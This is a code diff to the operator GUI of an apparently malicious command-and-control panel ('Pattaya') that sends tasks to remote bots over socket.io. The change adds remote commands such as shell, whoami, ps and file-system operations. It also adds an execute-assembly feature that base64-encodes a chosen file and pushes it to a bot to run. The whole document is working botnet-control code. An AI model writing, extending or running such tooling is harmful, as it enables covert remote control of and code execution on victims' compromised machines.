@@ -1,4 +1,4 @@
-from PySide6.QtWidgets import QWidget,QCompleter
+from PySide6.QtWidgets import QWidget,QCompleter,QFileDialog
 from PySide6.QtGui import QIcon,QFont,QKeyEvent,QPalette,QColor
 from PySide6.QtCore import Qt
 from core.util import PattayaPanelUtil
@@ -48,7 +48,7 @@ QTextEdit {
         self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
-        self.commands = ['killbot', 'pingbot', 'help']
+        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly', 'clear']
         self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
         self.completer.setCompletionMode(QCompleter.InlineCompletion)
 
@@ -81,6 +81,25 @@ QTextEdit {
             self.task_result_text_browser.append(PattayaPanelUtil.get_terminal_help())
             self.bot_send_task_line_edit.clear()
             return
+
+        if text == 'clear':
+            self.task_result_text_browser.clear()
+            self.task_result_text_browser.append(PattayaPanelUtil.get_banner())
+            self.update_bot_terminal(text)
+            self.bot_send_task_line_edit.clear()
+            return
+
+        file = ""
+        if text == 'execute-assembly':
+            file_name,_ = QFileDialog.getOpenFileName(self, "Open File",
+                                                        ".",
+                                                        "All files(*.*)")
+            
+            if file_name == "":
+                return
+            
+            file = PattayaPanelUtil.base64_file_encode(file_name)
+            PattayaPanelUtil.panel_log_info(f'f{file_name} has been encoded in base64 format: f{file}')
         
         PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
         self.update_bot_terminal(text)
@@ -92,12 +111,13 @@ QTextEdit {
         else:
             arg = args[1]
 
+
         bot_task = {
             "socketId": self.bot['socketId'],
             "hwid": self.bot['hwid'],
             "command": command,
             "arguments": arg,
-            "file": "" 
+            "file": file
         }
         try:
             self.socket_io_client.send_command('panel_send_bot_task', bot_task)
@@ -128,7 +148,7 @@ QTextEdit {
     def server_update_bot_terminal(self, result):
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
-        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F7810A'> ⮜⮜⮜</font></font><font color='#00E3FA'><br>{result}</font><br>")
+        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F7810A'> ⮜⮜⮜</font></font><font color='#00E3FA'><br><pre>{result}</pre></font><br>")
         self.task_result_text_browser.ensureCursorVisible()
 
     def update_bot_terminal(self, command):
